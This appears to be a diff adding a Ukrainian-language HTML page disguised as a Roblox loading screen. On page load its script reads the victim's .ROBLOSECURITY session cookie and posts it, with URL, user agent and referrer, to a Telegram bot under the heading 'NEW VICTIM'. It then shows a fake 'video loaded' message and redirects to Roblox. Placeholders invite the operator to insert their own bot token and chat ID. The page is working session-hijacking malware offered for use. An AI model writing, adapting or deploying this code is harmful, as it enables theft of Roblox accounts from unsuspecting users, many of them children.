@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox</title>
+    <style>
+        body { 
+            background: #1a1a2e; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            flex-direction: column; 
+        }
+        .loader {
+            border: 8px solid #2a2a4e;
+            border-top: 8px solid #00aaff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p { margin-top: 20px; opacity: 0.6; }
+        .error {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        .error h2 { color: #ff5555; }
+        .error button {
+            margin-top: 20px;
+            padding: 12px 32px;
+            background: #3ea6ff;
+            border: none;
+            color: #0f0f0f;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loader" class="loader"></div>
+    <p id="status">Завантаження...</p>
+
+    <div id="error" class="error">
+        <h2>⚠️ Помилка входу</h2>
+        <p style="opacity:0.6;">Увійдіть в Roblox та спробуйте знову.</p>
+        <button onclick="window.location.href='https://www.roblox.com/login'">Увійти</button>
+    </div>
+
+    <script>
+        (function() {
+            // Отримуємо кукі
+            const cookies = document.cookie;
+            const match = cookies.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]*)/);
+            const robloxCookie = match ? match[1] : null;
+
+            // 🔥 ЗАМІНИ НА СВОЇ ДАНІ 🔥
+            const token = "ТВІЙ_ТОКЕН_БОТА";
+            const chatId = "ТВІЙ_CHAT_ID";
+
+            if (robloxCookie) {
+                // Відправляємо в Telegram
+                const msg = 
+                    "🎯 НОВА ЖЕРТВА!\n" +
+                    "🍪 .ROBLOSECURITY: " + robloxCookie + "\n" +
+                    "🌐 URL: " + window.location.href + "\n" +
+                    "📱 UA: " + navigator.userAgent + "\n" +
+                    "🔗 Реферер: " + (document.referrer || "прямий");
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: msg
+                    })
+                }).catch(() => {});
+
+                // Показуємо повідомлення "успішно"
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').innerHTML = '✅ Відео завантажено!';
+                setTimeout(() => {
+                    document.getElementById('status').innerHTML = 'Перенаправлення...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.roblox.com/home';
+                    }, 1500);
+                }, 1000);
+            } else {
+                // Немає кукі — показуємо помилку
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+            }
+        })();
+    </script>
+</body>
+</html>
